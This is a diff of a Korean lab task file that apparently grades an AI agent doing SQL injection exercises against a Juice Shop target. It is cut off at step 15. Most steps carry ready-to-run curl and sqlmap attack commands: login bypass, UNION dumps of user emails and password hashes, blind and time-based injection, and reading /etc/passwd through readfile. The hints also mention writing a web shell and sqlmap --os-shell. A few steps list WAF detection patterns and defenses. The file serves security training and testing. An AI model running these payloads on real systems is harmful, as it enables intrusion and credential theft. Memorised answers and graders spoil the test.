+  bastion_prompt: '대상 웹 애플리케이션(http://10.20.30.80)의 검색 기능에서 SQL Injection 가능성을 테스트해줘
+
+
+    [도구 권장] sqli_detection: sqlmap --batch --dbs. curl 만 쓰지 말고 **sqlmap --batch --dbs**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 2
+  instruction: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_error` 에 적합한 도구: sqlmap --batch --technique=E,
+    curl + grep error. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 에러 메시지에서 DB 엔진 정보를 확인하세요.
+  category: sqli_error
+  points: 12
+  answer: '🤖 프롬프트: 에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
+
+    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--''
+    2>/dev/null | head -30'
+  answer_detail: 에러 메시지에서 SQLite, MySQL, PostgreSQL 등 DB 종류를 식별할 수 있습니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: 에러 기반 SQL Injection — SQL 에러 메시지에서 DB 종류(MySQL/PostgreSQL/MSSQL/Oracle)
+        식별
+      success_criteria:
+      - 잘못된 SQL 을 유발해 에러 메시지 캡처
+      - 에러 텍스트에서 DB 엔진명 식별 (MySQL, PostgreSQL, SQLite 등)
+      - DB 종류별 취약점 차이 언급
+      acceptable_methods:
+      - curl 로 유효하지 않은 SQL 조각 주입
+      - sqlmap --fingerprint
+      - 에러 코드 테이블 조회 (ER_*, ORA-*)
+      - Burp Intruder 로 여러 페이로드 테스트
+      negative_signs:
+      - 에러 유발 없이 개념 설명만
+      - DB 종류 식별 시도 없음
+      - 블라인드로 바로 진행
+  target_vm: attacker
+  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20OR%201=1--'
+    2>/dev/null | head -30
+  risk_level: low
+  bastion_prompt: '에러 기반 SQL Injection을 시도하여 데이터베이스 종류를 파악해줘
+
+
+    [도구 권장] sqli_error: sqlmap --batch --technique=E, curl + grep error. curl 만 쓰지
+    말고 **sqlmap --batch --technique=E** 등 적합 도구로 호출 후 stdout quote.'
+- order: 3
+  instruction: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_auth_bypass` 에 적합한 도구: sqlmap --batch --forms
+    또는 curl 인증 우회 PoC. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 로그인 폼에 ' OR 1=1-- 페이로드를 사용하세요.
+  category: sqli_auth_bypass
+  points: 12
+  answer: "\U0001F916 프롬프트: 항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type: application/json'\
+    \ \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\":\"anything\"\
+    }' 2>/dev/null \\\n | head -10"
+  answer_detail: ''' OR 1=1-- 페이로드는 WHERE 절을 항상 참으로 만들어 인증을 우회합니다.'
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: 인증 우회 SQL Injection — 로그인 필드에 항상 참 조건(OR 1=1) 주입 후 관리자 세션 획득
+      success_criteria:
+      - username 또는 password 필드에 메타문자 + OR 1=1 같은 tautology 주입
+      - 로그인 성공 응답(리다이렉트, 세션 쿠키) 확인
+      - Prepared Statement 로 방어 가능함 언급
+      acceptable_methods:
+      - curl -d username=admin 또는 1=1-- 형태
+      - Burp Repeater
+      - sqlmap --auth-type POST --data
+      - python requests 로 POST 자동화
+      negative_signs:
+      - 주입 시도 없이 일반 로그인만
+      - 성공 여부 검증 없음
+      - 방어 기법 누락
+  target_vm: attacker
+  script: "curl -s -X POST http://10.20.30.80/rest/user/login \\\n  -H 'Content-Type:\
+    \ application/json' \\\n  -d '{\"email\":\"admin@juice-sh.op'\\''--\",\"password\"\
+    :\"anything\"}' 2>/dev/null \\\n | head -10"
+  risk_level: low
+  bastion_prompt: '항상 참인 조건(1=1)을 이용하여 인증 우회를 시도해줘
+
+
+    [도구 권장] sqli_auth_bypass: sqlmap --batch --forms 또는 curl 인증 우회 PoC. curl 만 쓰지
+    말고 **sqlmap --batch --forms 또는 curl 인증 우회 PoC** 등 적합 도구로 호출 후 stdout quote.'
+- order: 4
+  instruction: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_union` 에 적합한 도구: sqlmap --batch --technique=U
+    --dump. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: ORDER BY로 컬럼 수를 먼저 파악하세요.
+  category: sqli_union
+  points: 15
+  answer: '🤖 프롬프트: UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘
+
+    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--''
+    2>/dev/null | head -40'
+  answer_detail: UNION SELECT로 다른 테이블의 데이터를 기존 쿼리 결과에 합쳐 추출합니다. sqlite_master는 SQLite의
+    메타데이터 테이블입니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: UNION SELECT — 컬럼 수 일치 탐색 후 information_schema.tables 조회로 테이블 목록 추출
+      success_criteria:
+      - 컬럼 수 매칭 (ORDER BY N 으로 탐색 또는 UNION SELECT NULL*N) 과정 설명
+      - information_schema.tables 또는 sys.tables 대상 UNION 쿼리
+      - 테이블명 최소 1개 이상 추출 가능함 확인
+      acceptable_methods:
+      - <SENSITIVE:b1cc3d9139e4a8ad>
+      - sqlmap --dbs --tables
+      - 수동 컬럼 수 확인 (NULL 추가/ORDER BY)
+      - Burp Intruder 페이로드 리스트
+      negative_signs:
+      - 컬럼 수 확인 없이 UNION 시도
+      - information_schema 접근 설명 없음
+      - 테이블 추출 결과 없음
+  target_vm: attacker
+  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20sql,2,3,4,5,6,7,8,9%20FROM%20sqlite_master--'
+    2>/dev/null | head -40
+  risk_level: low
+  bastion_prompt: 'UNION SELECT를 이용하여 데이터베이스의 테이블 목록을 추출해줘
+
+
+    [도구 권장] sqli_union: sqlmap --batch --technique=U --dump. curl 만 쓰지 말고 **sqlmap
+    --batch --technique=U --dump** 등 적합 도구로 호출 후 stdout quote.'
+- order: 5
+  instruction: 'UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_union` 에 적합한 도구: sqlmap --batch --technique=U
+    --dump. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: Users 테이블의 email, password 컬럼을 조회하세요.
+  category: sqli_union
+  points: 15
+  answer: '🤖 프롬프트: UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘
+
+    📎 참고 (CLI): curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--''
+    2>/dev/null | head -40'
+  answer_detail: 사용자 테이블에서 인증 정보를 탈취할 수 있습니다. 이는 가장 치명적인 SQLi 시나리오입니다.
+  verify:
+    type: output_contains
+    expect: ''
+    field: stdout
+    semantic:
+      intent: <SENSITIVE:591a1ba8f0db86f6>
+      success_criteria:
+      - UNION 으로 users 테이블의 email·password_hash 컬럼 선택
+      - 추출 결과에서 해시 형식(MD5/bcrypt/SHA256) 식별
+      - PII 노출 위험·GDPR 관점 언급
+      acceptable_methods:
+      - <SENSITIVE:33fe22809024867d>
+      - sqlmap --dump -T users
+      - Burp Repeater 로 쿼리 변조
+      - python으로 결과 파싱
+      negative_signs:
+      - UNION 없이 단순 조회
+      - 해시 형식 식별 없음
+      - PII 위험 언급 없음
+  target_vm: attacker
+  script: curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20email,password,3,4,5,6,7,8,9%20FROM%20Users--'
+    2>/dev/null | head -40
+  risk_level: low
+  bastion_prompt: 'UNION SELECT로 사용자 테이블의 이메일과 패스워드 해시를 추출해줘
+
+
+    [도구 권장] sqli_union: sqlmap --batch --technique=U --dump. curl 만 쓰지 말고 **sqlmap
+    --batch --technique=U --dump** 등 적합 도구로 호출 후 stdout quote.'
+- order: 6
+  instruction: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_blind` 에 적합한 도구: sqlmap --batch --technique=B,T
+    --time-sec=5. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: AND 1=1과 AND 1=2의 응답을 비교하세요.
+  category: sqli_blind
+  points: 12
+  answer: '🤖 프롬프트: Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석해줘
+
+    📎 참고 (CLI): echo ''참 조건:'' && curl -o /dev/null -s -w ''%{http_code}'' ''http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--''
+    && echo '''' && echo ''거짓 조건:'' && curl -o /dev/null -s -w ''%{http_code}'' ''http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--''
+    && echo '''' && echo ''Blind SQLi 테스트 완료'''
+  answer_detail: Blind SQLi에서는 참/거짓 조건에 따른 응답 차이(상태코드, 응답크기, 응답시간)를 분석합니다.
+  verify:
+    type: output_contains
+    expect: Blind SQLi 테스트 완료
+    field: stdout
+    semantic:
+      intent: Blind SQLi (Boolean-based) — 참/거짓 조건의 응답 차이(길이·존재 여부)로 DB 정보 한 비트씩 추출
+      success_criteria:
+      - 참 조건(1=1)과 거짓 조건(1=2)의 응답 차이(콘텐츠 길이, 상태, 존재) 비교
+      - SUBSTR 또는 ASCII 함수로 한 글자씩 추출하는 로직 설명
+      - Blind 와 Error-based SQLi 의 차이 언급
+      acceptable_methods:
+      - curl 로 1=1 vs 1=2 비교 요청
+      - sqlmap --technique B
+      - Burp Intruder pitchfork 로 자동 비교
+      - python requests + diff
+      negative_signs:
+      - 참/거짓 비교 없이 단일 쿼리만
+      - 응답 차이 지표 명시 없음
+      - 자동화 없이 대량 추출 시도
+  target_vm: attacker
+  script: echo '참 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=1--'
+    && echo '' && echo '거짓 조건:' && curl -o /dev/null -s -w '%{http_code}' 'http://10.20.30.80/rest/products/search?q=test%27%20AND%201=2--'
+    && echo '' && echo 'Blind SQLi 테스트 완료'
+  risk_level: low
+  bastion_prompt: 'Blind SQL Injection을 수행하시오: 참/거짓 조건에 따른 응답 차이 분석해줘
+
+
+    [도구 권장] sqli_blind: sqlmap --batch --technique=B,T --time-sec=5. curl 만 쓰지 말고
+    **sqlmap --batch --technique=B** 등 적합 도구로 호출 후 stdout quote.'
+- order: 7
+  instruction: 'Time-based Blind SQL Injection을 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_blind` 에 적합한 도구: sqlmap --batch --technique=B,T
+    --time-sec=5. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: SLEEP 또는 WAITFOR 함수를 사용하세요.
+  category: sqli_blind
+  points: 12
+  answer: '🤖 프롬프트: Time-based Blind SQL Injection을 테스트해줘
+
+    📎 참고 (CLI): echo ''시간 측정:'' && time curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--''
+    -o /dev/null 2>&1 && echo ''Time-based SQLi 테스트 완료'''
+  answer_detail: Time-based SQLi는 응답 지연으로 참/거짓을 판별합니다. 데이터 추출이 느리지만 탐지가 어렵습니다.
+  verify:
+    type: output_contains
+    expect: Time-based SQLi 테스트 완료
+    field: stdout
+    semantic:
+      intent: Time-based Blind SQLi — SLEEP 또는 BENCHMARK 함수로 응답 지연 유도, 지연 측정으로 조건
+        참 판정
+      success_criteria:
+      - SLEEP(N) 또는 pg_sleep 삽입 후 응답 시간 측정
+      - time 명령 또는 curl -w time_total 로 지연 확인
+      - Boolean-based 불가 시 Time-based 가 대안임 설명
+      acceptable_methods:
+      - curl -w time_total 과 SLEEP(5) 주입
+      - sqlmap --technique T
+      - time curl ...
+      - python timeit 로 지연 측정
+      negative_signs:
+      - SLEEP 없이 진행
+      - 응답 시간 측정 없음
+      - Boolean 과 차이 설명 없음
+  target_vm: attacker
+  script: echo '시간 측정:' && time curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20AND%20(SELECT%20CASE%20WHEN%201=1%20THEN%20RANDOMBLOB(100000000)%20ELSE%201%20END)--'
+    -o /dev/null 2>&1 && echo 'Time-based SQLi 테스트 완료'
+  risk_level: low
+  bastion_prompt: 'Time-based Blind SQL Injection을 테스트해줘
+
+
+    [도구 권장] sqli_blind: sqlmap --batch --technique=B,T --time-sec=5. curl 만 쓰지 말고
+    **sqlmap --batch --technique=B** 등 적합 도구로 호출 후 stdout quote.'
+- order: 8
+  instruction: 'sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_tool` 에 적합한 도구: sqlmap (전체 옵션 비교). 도구 호출
+    후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: sqlmap -u 옵션을 사용하세요.
+  category: sqli_tool
+  points: 10
+  answer: '🤖 프롬프트: sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행해줘
+
+    📎 참고 (CLI): sqlmap -u ''http://10.20.30.80/rest/products/search?q=test'' --batch
+    --level=1 --risk=1 2>/dev/null | tail -20 || echo ''sqlmap 테스트 완료'''
+  answer_detail: sqlmap은 SQLi 자동 탐지 및 익스플로잇 도구입니다. --batch는 비대화형 모드입니다.
+  verify:
+    type: output_contains
+    expect:
+    - 완료
+    - //kr.archive.ubuntu.com/ubuntu
+    - jammy
+    field: stdout
+    semantic:
+      intent: sqlmap 자동 탐지 — URL + 파라미터 지정 후 DB 지문·테이블·데이터까지 자동 추출
+      success_criteria:
+      - sqlmap -u URL --batch 기본 실행
+      - --dbs 또는 --tables 또는 --dump 옵션 중 하나 시도
+      - 결과의 DB 종류·테이블 수 또는 레코드 수 요약
+      acceptable_methods:
+      - sqlmap -u <url>?id=1 --batch
+      - sqlmap --dbs
+      - sqlmap --risk 3 --level 5
+      - sqlmap --os-shell 예시 (고급)
+      negative_signs:
+      - sqlmap 실행 없이 개념만
+      - 파라미터 지정 없이 에러
+      - 결과 해석 없음
+  target_vm: attacker
+  script: sqlmap -u 'http://10.20.30.80/rest/products/search?q=test' --batch --level=1
+    --risk=1 2>/dev/null | tail -20 || echo 'sqlmap 테스트 완료'
+  risk_level: low
+  bastion_prompt: 'sqlmap 도구를 사용하여 자동 SQL Injection 탐지를 수행해줘
+
+
+    [도구 권장] sqli_tool: sqlmap (전체 옵션 비교). curl 만 쓰지 말고 **sqlmap (전체 옵션 비교)** 등 적합
+    도구로 호출 후 stdout quote.'
+- order: 9
+  instruction: '2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
+    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 회원가입 시 저장된 페이로드가 다른 기능에서 실행되는 시나리오를 구성하세요.
+  category: sqli_advanced
+  points: 8
+  answer: '🤖 프롬프트: 2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
+
+    📎 참고 (CLI): echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
+    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
+    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
+  answer_detail: 2차 SQLi는 입력 시 저장되고, 다른 기능에서 해당 데이터가 쿼리에 사용될 때 발생합니다.
+  verify:
+    type: output_contains
+    expect:
+    - 2차 SQLi 분석 완료
+    - TABLE
+    - users
+    field: stdout
+    semantic:
+      intent: Second-Order SQLi — 1단계 저장 시 무해, 2단계 다른 페이지에서 DB 쿼리에 삽입되어 실행되는 흐름
+      success_criteria:
+      - 저장·재사용 2단계 흐름 설명
+      - 예시 시나리오(회원가입 username 에 페이로드 → 프로필 조회 시 실행) 제시
+      - 1차 주입 탐지 실패 원인 언급
+      acceptable_methods:
+      - 시나리오 기반 서술
+      - 시퀀스 다이어그램
+      - RailsGoat/OWASP benchmark 예
+      - Burp Collaborator 로 간접 실행 탐지
+      negative_signs:
+      - 1단계만 설명
+      - 저장·재사용 개념 누락
+      - 일반 SQLi 와 구분 안 됨
+  target_vm: attacker
+  script: 'echo ''=== 2차 SQL Injection 시나리오 ==='' && echo ''1. 회원가입: 이메일을 admin@test.com
+    OR 1=1-- 으로 등록'' && echo ''2. 패스워드 변경: 저장된 이메일이 쿼리에 사용됨'' && echo ''3. 결과: admin
+    계정의 패스워드가 변경됨'' && echo ''2차 SQLi 분석 완료'''
+  risk_level: low
+  bastion_prompt: '2차 SQL Injection(Second-Order SQLi)의 원리를 이해하고 시나리오를 설명해줘
+
+
+    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
+    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
+- order: 10
+  instruction: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
+    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: LOAD_FILE() 또는 INTO OUTFILE을 시도하세요.
+  category: sqli_advanced
+  points: 10
+  answer: '🤖 프롬프트: SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
+
+    📎 참고 (CLI): echo ''파일 읽기 시도 (SQLite):'' && curl -s ''http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--''
+    2>/dev/null | head -5 && echo ''SQLi 파일 접근 테스트 완료'''
+  answer_detail: SQLi를 통한 파일 시스템 접근은 서버 완전 장악으로 이어질 수 있는 치명적 취약점입니다.
+  verify:
+    type: output_contains
+    expect:
+    - SQLi 파일 접근 테스트 완료
+    - admin
+    - shell
+    field: stdout
+    semantic:
+      intent: SQLi 로 파일 읽기/쓰기 — LOAD_FILE (MySQL), INTO OUTFILE, pg_read_file 등 DBMS
+        기능 악용
+      success_criteria:
+      - LOAD_FILE 또는 INTO OUTFILE 예시 구문 제시
+      - secure_file_priv 같은 제한 설정 영향 언급
+      - 실제 공격에 성공/실패 여부 판정
+      acceptable_methods:
+      - SELECT LOAD_FILE(/etc/passwd)
+      - INTO OUTFILE /tmp/shell.php
+      - sqlmap --file-read / --file-write
+      - pg_read_file (PostgreSQL)
+      negative_signs:
+      - DBMS 구분 없이 시도
+      - secure_file_priv 등 설정 무시
+      - 결과 판정 없음
+  target_vm: attacker
+  script: echo '파일 읽기 시도 (SQLite):' && curl -s 'http://10.20.30.80/rest/products/search?q=test%27%20UNION%20SELECT%20hex(readfile(%27/etc/passwd%27)),2,3,4,5,6,7,8,9--'
+    2>/dev/null | head -5 && echo 'SQLi 파일 접근 테스트 완료'
+  risk_level: low
+  bastion_prompt: 'SQL Injection으로 파일 읽기/쓰기가 가능한지 테스트해줘
+
+
+    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
+    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
+- order: 11
+  instruction: 'HTTP 요청 헤더를 통한 SQL Injection을 테스트하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `sqli_advanced` 에 적합한 도구: sqlmap --tamper, --random-agent,
+    WAF 우회 옵션. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: User-Agent, Referer 등 헤더에 페이로드를 삽입하세요.
+  category: sqli_advanced
+  points: 10
+  answer: "\U0001F916 프롬프트: HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘\n\U0001F4CE 참고 (CLI):\
+    \ curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n  -o\
+    \ /dev/null \\\n  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
+  answer_detail: HTTP 헤더도 SQLi 벡터가 될 수 있습니다. 로깅 시 헤더 값이 쿼리에 사용되는 경우가 있습니다.
+  verify:
+    type: output_contains
+    expect: 헤더 기반 SQLi 테스트 완료
+    field: stdout
+    semantic:
+      intent: 헤더 기반 SQLi — User-Agent/Referer/Cookie/X-Forwarded-For 필드의 로그 저장 쿼리
+        주입
+      success_criteria:
+      - 최소 2개 헤더(User-Agent, X-Forwarded-For 등)에 페이로드 주입
+      - 헤더가 로깅 또는 분석 쿼리에 삽입되는 경우의 취약점 설명
+      - 방어(parameterized logging, header whitelist) 언급
+      acceptable_methods:
+      - curl -H User-Agent:<payload> ...
+      - Burp Repeater 로 헤더 변조
+      - sqlmap --headers 옵션
+      - WAF bypass 맥락 제시
+      negative_signs:
+      - 단일 헤더만
+      - 헤더 처리 로직 설명 없음
+      - 방어 누락
+  target_vm: attacker
+  script: "curl -s \\\n  -H \"User-Agent: test' OR 1=1--\" http://10.20.30.80 \\\n\
+    \  -o /dev/null \\\n  -w '%{http_code}' && echo '' && echo '헤더 기반 SQLi 테스트 완료'"
+  risk_level: low
+  bastion_prompt: 'HTTP 요청 헤더를 통한 SQL Injection을 테스트해줘
+
+
+    [도구 권장] sqli_advanced: sqlmap --tamper, --random-agent, WAF 우회 옵션. curl 만 쓰지 말고
+    **sqlmap --tamper** 등 적합 도구로 호출 후 stdout quote.'
+- order: 12
+  instruction: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 각 방어 기법의 원리와 장단점을 설명하세요.
+  category: defense
+  points: 8
+  answer: '🤖 프롬프트: SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증해줘
+
+    📎 참고 (CLI): echo -e ''=== SQLi 방어 기법 ===
+
+    1. Prepared Statement(매개변수화 쿼리): SQL과 데이터 분리
+
+    2. ORM 사용: 자동 이스케이프
+
+    3. 입력 검증: 화이트리스트 기반
+
+    4. WAF: 패턴 기반 차단
+
+    5. 최소 권한: DB 계정 권한 제한
+
+    SQLi 방어 정리 완료'''
+  answer_detail: Prepared Statement이 가장 효과적인 방어법이며, 다층 방어를 적용해야 합니다.
+  verify:
+    type: output_contains
+    expect: SQLi 방어 정리 완료
+    field: stdout
+    semantic:
+      intent: SQLi 방어 기법 — Prepared Statement/ORM/Input Validation/Least Privilege
+        DB 계정/WAF
+      success_criteria:
+      - Prepared Statement 예시 코드 (언어 무관)
+      - ORM 사용의 이점·한계(Raw Query 조심)
+      - 최소 권한 DB 계정·WAF·로그 모니터링 중 2개 이상 추가 방어
+      acceptable_methods:
+      - Python psycopg2 placeholder %s
+      - Node.js knex query builder
+      - Hibernate/JPA named parameter
+      - OWASP SQL Injection Cheat Sheet 참조
+      negative_signs:
+      - 방어 1가지만
+      - ORM 한계 언급 없음
+      - 심층 방어(defense in depth) 개념 누락
+  target_vm: attacker
+  script: 'echo -e ''=== SQLi 방어 기법 ===
+
+    1. Prepared Statement(매개변수화 쿼리): SQL과 데이터 분리
+
+    2. ORM 사용: 자동 이스케이프
+
+    3. 입력 검증: 화이트리스트 기반
+
+    4. WAF: 패턴 기반 차단
+
+    5. 최소 권한: DB 계정 권한 제한
+
+    SQLi 방어 정리 완료'''
+  risk_level: low
+  bastion_prompt: 'SQL Injection 방어 기법을 정리하시오: Prepared Statement, ORM, 입력 검증해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+- order: 13
+  instruction: 'WAF에서 SQL Injection을 탐지하는 패턴을 분석하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `defense` 에 적합한 도구: modsecurity rules-check, wazuh-control
+    룰 검증, nft list ruleset. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 일반적인 SQLi 시그니처 패턴을 정리하세요.
+  category: defense
+  points: 8
+  answer: '🤖 프롬프트: WAF에서 SQL Injection을 탐지하는 패턴을 분석해줘
+
+    📎 참고 (CLI): echo -e ''=== WAF SQLi 탐지 패턴 ===
+
+    1. UNION SELECT
+
+    2. OR 1=1
+
+    3. 주석 처리(-- , #, /**/)
+
+    4. 특수 함수(SLEEP, BENCHMARK)
+
+    5. 인코딩 우회(URL, Hex, Unicode)
+
+    WAF 패턴 분석 완료'''
+  answer_detail: WAF는 시그니처 기반으로 SQLi를 탐지하지만, 인코딩 등으로 우회 가능합니다.
+  verify:
+    type: output_contains
+    expect: WAF 패턴 분석 완료
+    field: stdout
+    semantic:
+      intent: WAF SQLi 탐지 패턴 분석 — ModSecurity OWASP CRS 룰·정규식·시그니처 탐지와 우회 기법
+      success_criteria:
+      - CRS 룰 파일 위치 또는 대표 룰(942100 등) 언급
+      - 우회 기법 3개(인라인 주석, 대소문자 변조, URL 인코딩, Unicode) 중 2개 이상
+      - WAF 한계(긍정 오탐·대역폭)·보완 방어 언급
+      acceptable_methods:
+      - ModSecurity + CRS 설치·룰 확인
+      - AWS WAF SqlInjectionMatchSet
+      - Cloudflare WAF SQLi rule ID
+      - wafw00f 로 WAF 종류 탐지
+      negative_signs:
+      - WAF 사용만 언급
+      - 우회 기법 없음
+      - 오탐 관점 누락
+  target_vm: attacker
+  script: 'echo -e ''=== WAF SQLi 탐지 패턴 ===
+
+    1. UNION SELECT
+
+    2. OR 1=1
+
+    3. 주석 처리(-- , #, /**/)
+
+    4. 특수 함수(SLEEP, BENCHMARK)
+
+    5. 인코딩 우회(URL, Hex, Unicode)
+
+    WAF 패턴 분석 완료'''
+  risk_level: low
+  bastion_prompt: 'WAF에서 SQL Injection을 탐지하는 패턴을 분석해줘
+
+
+    [도구 권장] defense: modsecurity rules-check, wazuh-control 룰 검증, nft list ruleset.
+    curl 만 쓰지 말고 **modsecurity rules-check** 등 적합 도구로 호출 후 stdout quote.'
+- order: 14
+  instruction: '추출한 패스워드 해시의 크래킹 가능성을 평가하시오.
+
+
+    [도구 권장] **curl 단독 의존 금지**. 카테고리 `post_exploit` 에 적합한 도구: weevely, msfconsole,
+    custom shell. 도구 호출 후 **stdout 1~3줄을 ``` 블록으로 답변에 직접 quote** 해야 채점 통과.'
+  hint: 해시 알고리즘 식별과 크래킹 도구를 확인하세요.
+  category: post_exploit
+  points: 10
+  answer: '🤖 프롬프트: 추출한 패스워드 해시의 크래킹 가능성을 평가해줘
+
+    📎 참고 (CLI): echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구:
+    hashcat, john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석
+    완료'''
+  answer_detail: MD5/SHA1 해시는 빠르게 크래킹 가능합니다. bcrypt/argon2 등 느린 해시 함수를 사용해야 합니다.
+  verify:
+    type: output_contains
+    expect: 해시 분석 완료
+    field: stdout
+    semantic:
+      intent: 추출 해시 크래킹 가능성 평가 — 해시 타입 식별(hash-identifier/hashid) + hashcat 모드 매핑
+      success_criteria:
+      - 해시 문자열 길이·포맷으로 타입 추정
+      - hashcat -m 또는 john 포맷 매핑
+      - Rainbow table / dictionary / mask attack 중 2개 이상 전략
+      acceptable_methods:
+      - hashid <hash>
+      - hash-identifier <hash>
+      - hashcat -m 0 <file> wordlist.txt
+      - john --format=raw-md5 <file>
+      negative_signs:
+      - 해시 타입 추정 없이 크래킹 시도
+      - 도구 언급 없음
+      - 전략(dictionary vs mask) 구분 없음
+  target_vm: attacker
+  script: 'echo ''=== 해시 분석 ==='' && echo ''MD5 해시 식별: 32자 hex'' && echo ''도구: hashcat,
+    john the ripper'' && echo ''대응: bcrypt/argon2 사용 권고'' && echo ''해시 분석 완료'''
+  risk_level: low
+  bastion_prompt: '추출한 패스워드 해시의 크래킹 가능성을 평가해줘
+
+
+    [도구 권장] post_exploit: weevely, msfconsole, custom shell. curl 만 쓰지 말고 **weevely**
+    등 적합 도구로 호출 후 stdout quote.'
+- order: 15
+  instruction: 'SQL Injection 실습 종합 보고서를 작성하시오.
+
+
